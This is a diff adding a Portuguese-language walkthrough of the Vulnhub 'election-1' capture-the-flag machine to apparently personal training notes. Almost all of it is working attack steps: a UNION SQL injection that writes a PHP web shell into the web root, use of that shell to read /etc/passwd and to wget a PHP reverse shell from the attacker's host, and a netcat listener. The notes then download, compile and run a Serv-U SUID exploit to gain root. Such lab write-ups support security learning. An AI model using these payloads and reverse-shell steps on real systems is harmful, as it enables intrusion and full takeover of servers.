@@ -20,7 +20,7 @@ Desafio 17 - Manual Webmin 1.920 exploit | CVE-2019-15107 | Crontab - https://ww
 Desafio 18 - CWE-521 | Tomcat7 bad .jsp | CWE-732 crontab  	    - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
 Desafio 19 - Parameter Fuzzing | Password Spray | CVE-2017-16995 - https://www.vulnhub.com/entry/prime-1,358/</br>
 Desafio 20 - IDT 'perf_swevent_init' Local Privilege Escalation - https://www.vulnhub.com/entry/sumo-1,480/ </br>
-Desafio 21 - - https://www.vulnhub.com/entry/election-1,503/ </br>
+Desafio 21 - Solar Winds Serv-U - CVE-2019-12181 | SQLI into dumpfile - https://www.vulnhub.com/entry/election-1,503/ </br>
 Desafio 22 - - </br>
 <br/>**--VM--**
 
@@ -936,3 +936,73 @@ Desafio 22 - - </br>
 					
 				#root
 
+
+<h3>Dia 21 			27/9/2020</h3>
+
+	*scan default
+	
+	*ip/robots.txt
+		#ip/election
+		
+		searchsploit election
+			#searchsploit -m 48122		
+			cat 48122
+			
+	*dirb  http://ip/election -X .php
+		
+		#card.php
+			#decode binary
+				#decode binary
+		
+		user: 1234
+		pass: Zxc123!@#
+	
+	http://ip/election/admin
+		
+	*Burp suite
+		#election
+		 	-candidates
+				-love -> editar   (capturar essa requisição)
+					
+					
+		*repeater					
+		exemplo: {"code":"200","nama":"Love","kelas":"1","fbid":"","bio":"admin1"}
+			#SQLI
+				aksi=fetch&id=76 order by 5--
+					*aksi=fetch&id=76 union select 'T','E','S','T','E'
+					
+					aksi=fetch&id=1 union select '','','',version(),''--
+				
+						*ip/phpinfo.php
+							raíz: /var/www/html
+		
+					aksi=fetch&id=1 union select ' ',' ',' ',' ',"<?php system($_GET['a']);?> " into dumpfile '/var/www/html/arquivo.php'--
+		
+				#Browser
+				http://192.168.100.27/arquivo.php?a=cat /etc/passwd
+		
+		*nc -lnvp 443
+		
+		*cp /usr/share/webshells/php/php-reverse-shell.php  ./
+			nanophp-reverse-shell.php 
+				alterar ip e porta
+				ip:kali
+				porta:443
+				
+		*python3 http.server
+		
+		*http://192.168.100.27/arquivo.php?a=wget http://192.168.100.22:8000/php-reverse-shell.php
+			http://192.168.100.27/php-reverse-shell.php
+			#nc
+			
+	*nc
+		find / -perm  -u=s -type f 2>&-
+		##/usr/local/Serv-U/Serv-U  
+		
+			#kali: searchsploit -m 47009
+				python -m SimpleHTTPServer 8080
+			
+		wget http:/192.168.100.22:8080/47009.c
+		gcc 47009.c -o beco21
+		./beco21
+		 root
